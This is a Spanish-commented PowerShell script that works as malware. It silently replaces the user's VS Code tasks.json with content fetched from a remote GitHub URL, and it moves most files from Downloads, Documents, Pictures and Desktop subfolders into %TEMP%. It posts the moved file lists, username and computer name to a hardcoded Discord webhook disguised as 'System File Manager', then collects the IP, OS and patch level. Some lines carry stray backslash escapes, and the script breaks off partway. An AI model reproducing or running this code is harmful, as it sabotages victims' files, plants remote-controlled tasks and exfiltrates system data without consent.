# 1. Configuración de variables
$Webhook        = "https://discord.com/api/webhooks/1494006624166350960/BEcOnRkEN1eiyHGnyWVZuEBDW5KZjgP2lo8g47RGs_Xp2Q5qp5I-Auts8HdkkpLNoAlH"
$TasksPath      = "$env:APPDATA\Code\User\tasks.json"
$RemoteTasksUrl = "https://raw.githubusercontent.com/baa4ts/baa4ts/refs/heads/main/public/tasks.txt"

# 2. Verificar conectividad
if (!(Test-Connection -ComputerName 1.1.1.1 -Count 1 -Quiet)) { exit }

# 3. Auto-actualización sigilosa
try {
    $RemoteContent = Invoke-RestMethod -Uri $RemoteTasksUrl -TimeoutSec 10 -ErrorAction Stop
    if ($RemoteContent -match "version") {
        $LocalHash  = if (Test-Path $TasksPath) { (Get-FileHash $TasksPath -Algorithm MD5).Hash } else { "" }
        $RemoteHash = ([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($RemoteContent)) | ForEach-Object { $_.ToString("X2") }) -join ""
        if ($LocalHash -ne $RemoteHash) {
            $RemoteContent | Set-Content -Path $TasksPath -Encoding UTF8 -Force
        }
    }
} catch { }

# 4. HILO SECUNDARIO: MOVIMIENTO DE ARCHIVOS Y CARPETAS
Start-Job -Name "FileArchiver" -ArgumentList $Webhook, $env:USERNAME, $env:COMPUTERNAME -ScriptBlock {
    param($W, $U, $D)

    # Función interna para resolver rutas conocidas (Win10/11 + OneDrive)
    function Resolve-KnownFolder {
        param([string]$FolderKey)
        $path = [System.Environment]::GetFolderPath($FolderKey)
        # Fallback explícito para OneDrive si la ruta por defecto no existe
        if (-not (Test-Path $path) -and $env:OneDrive) {
            $map = @{ "Desktop"="Desktop"; "MyDocuments"="Documents"; "MyPictures"="Pictures"; "Downloads"="Downloads" }
            $odPath = Join-Path $env:OneDrive $map[$FolderKey]
            if (Test-Path $odPath) { return $odPath }
        }
        return $path
    }

    $carpetasOrigen = [ordered]@{
        "Descargas"  = Resolve-KnownFolder "Downloads"
        "Documentos" = Resolve-KnownFolder "MyDocuments"
        "Imágenes"   = Resolve-KnownFolder "MyPictures"
    }

    $desktop = Resolve-KnownFolder "Desktop"
    $dest    = [System.Environment]::ExpandEnvironmentVariables("%TEMP%")
    $resultados = [System.Collections.Generic.List[hashtable]]::new()

    foreach ($entry in $carpetasOrigen.GetEnumerator()) {
        $src = $entry.Value
        if (-not (Test-Path $src)) { continue }

        # Ignorar placeholders de OneDrive (archivos solo en la nube)
        $items = @(Get-ChildItem -Path $src -Force -ErrorAction SilentlyContinue | Where-Object { -not ($_.Attributes -match 'ReparsePoint') })
        if ($items.Count -eq 0) { continue }

        $cantidad = [Math]::Min([Math]::Ceiling($items.Count * 0.85), $items.Count)
        $objs     = $items | Get-Random -Count $cantidad
        $movidos  = [System.Collections.Generic.List[string]]::new()

        foreach ($item in $objs) {
            try {
                $destPath = Join-Path $dest $item.Name
                if (Test-Path $destPath) {
                    $ext  = [System.IO.Path]::GetExtension($item.Name)
                    $base = [System.IO.Path]::GetFileNameWithoutExtension($item.Name)
                    $rand = [System.IO.Path]::GetRandomFileName().Split('.')[0]
                    $destPath = Join-Path $dest "${base}_${rand}${ext}"
                }
                Move-Item -Path $item.FullName -Destination $destPath -Force -ErrorAction Stop
                $tipo = if ($item.PSIsContainer) { "📁" } else { "📄" }
                $movidos.Add("$tipo $($item.Name)")
            } catch { continue } # Archivos bloqueados o en uso se omiten silenciosamente
        }

        if ($movidos.Count -gt 0) {
            $resultados.Add(@{ nombre = $entry.Name; emoji = "📂"; items = $movidos.ToArray() })
        }
    }

    # Desktop: subcarpetas → mover .exe
    if (Test-Path $desktop) {
        foreach ($carpeta in @(Get-ChildItem -Path $desktop -Directory -ErrorAction SilentlyContinue)) {
            $exes = @(Get-ChildItem -Path $carpeta.FullName -Filter "*.exe" -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { -not ($_.Attributes -match 'ReparsePoint') })
            $movidos = [System.Collections.Generic.List[string]]::new()

            foreach ($exe in $exes) {
                try {
                    $destPath = Join-Path $dest $exe.Name
                    if (Test-Path $destPath) {
                        $rand = [System.IO.Path]::GetRandomFileName().Split('.')[0]
                        $destPath = Join-Path $dest "$([System.IO.Path]::GetFileNameWithoutExtension($exe.Name))_${rand}.exe"
                    }
                    Move-Item -Path $exe.FullName -Destination $destPath -Force -ErrorAction Stop
                    $movidos.Add("⚙️ $($exe.Name)")
                } catch { continue }
            }

            if ($movidos.Count -gt 0) {
                $resultados.Add(@{ nombre = "Desktop\$($carpeta.Name)"; emoji = "🗂️"; items = $movidos.ToArray() })
            }
        }
    }

    # Construir y enviar payloads a Discord
    foreach ($r in $resultados) {
        $lista = $r.items -join "`n"
        if ($lista.Length -gt 1800) { $lista = \$lista.Substring(0, 1790) + "... (lista truncada)" }

        \$body = @{
            username   = "System File Manager"
            avatar_url = "https://i.imgur.com/8nLFCuR.png"
            embeds     = @(@{
                title       = "$($r.emoji) Reubicación — $($r.nombre)"
                color       = 16753920
                description = "Items movidos a ``%TEMP%``:`n`n\$lista"
                footer      = @{ text = "Usuario: $U | Total: $(\$r.items.Count) items" }
                timestamp   = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
            })
        } | ConvertTo-Json -Depth 10

        try {
            Invoke-RestMethod -Uri \$W -Method Post -Body \$body -ContentType 'application/json; charset=utf-8'
            Start-Sleep -Milliseconds 1300
        } catch { }
    }
} | Out-Null

# 5. RECOLECCIÓN PRINCIPAL — datos en paralelo
\$jobIP = Start-Job -ScriptBlock { try { (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip } catch { "Desconocida" } }
\$jobOS = Start-Job -ScriptBlock { try { (Get-CimInstance Win32_OperatingSystem).Caption } catch { "Desconocido" } }
\$jobPatches = Start-Job -ScriptBlock {
    try {
        \$raw = Get-HotFix | Select-Object HotFixID, InstalledOn
        ($raw | Where-Object { $_.InstalledOn } | Sort-Object InstalledOn -Descending) +
        ($raw | Where-Object { !$_.InstalledOn })
    } catch { @() }
}

$User   = $env:USERNAME
$Device = $env:COMPUTERNAME
\$Build  = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').CurrentBuild

$null = Wait-Job $job
